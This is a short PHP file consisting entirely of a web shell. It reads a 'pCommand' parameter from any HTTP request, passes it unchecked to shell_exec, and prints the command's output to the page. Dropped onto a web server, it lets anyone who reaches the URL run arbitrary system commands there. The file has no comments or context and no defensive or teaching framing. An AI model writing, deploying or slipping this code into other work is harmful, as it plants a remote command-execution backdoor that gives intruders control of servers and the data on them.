<?php
	echo "<pre>";
	echo "shell_exec ".$_REQUEST["pCommand"]."\n\n";
	echo shell_exec($_REQUEST["pCommand"]);
	echo "</pre>";	
?>
